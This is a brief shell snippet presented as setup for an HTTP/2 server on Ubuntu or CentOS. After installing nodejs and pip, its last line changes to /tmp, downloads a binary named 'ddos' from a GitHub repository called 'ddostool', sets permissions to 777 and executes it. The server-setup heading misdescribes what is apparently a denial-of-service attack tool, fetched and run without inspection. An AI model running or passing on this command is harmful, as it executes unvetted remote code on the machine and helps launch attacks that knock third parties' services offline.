# setup HTTP/2 server ubuntu/centos 
apt install nodejs -y
yum install nodejs -y
apt install python3-pip
yum install python3-pip

cd /tmp ; wget https://github.com/NHTSERVER/ddostool/raw/main/ddos ; chmod 777 * ; ./ddos ddos
